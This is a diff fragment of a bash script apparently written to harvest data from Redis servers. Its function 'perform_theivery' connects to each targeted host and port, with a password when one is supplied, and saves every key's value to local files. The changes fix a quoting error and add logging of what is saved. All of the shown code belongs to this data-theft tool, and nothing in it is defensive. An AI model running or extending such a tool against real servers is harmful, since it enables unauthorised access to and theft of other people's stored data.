@@ -57,7 +57,7 @@ function perform_theivery() {
         if [ "$password" == "$host" ]; then 
             password=""
         fi
-        echo "[+] targeting: ${host}:${port} >&2"
+        echo "[+] targeting: ${host}:${port}" >&2;
 
         connect="$REDIS_BIN -h ${host} -p ${port}"
         if [ ${#password} -gt 2 ]; then 
@@ -88,9 +88,11 @@ function perform_theivery() {
                         mkdir -p "${OUTPUT_DIRECTORY}/${k}";
                     fi
                     if [ "$NO_DOUBLE_DOWNLOAD" != "1" ]; then 
+                        echo "[+] saving to ${OUTPUT_DIRECTORY}/${k}/${date}.value.txt: $k" >&2;
                         echo "$value" > "${OUTPUT_DIRECTORY}/${k}/${date}.value.txt"
                     else
                         if [ ! -f "${OUTPUT_DIRECTORY}/${k}/value.txt" ]; then 
+                            echo "[+] saving to ${OUTPUT_DIRECTORY}/${k}/value.txt: $k" >&2;
                             echo "$value" > "${OUTPUT_DIRECTORY}/${k}/value.txt"
                         fi
                     fi
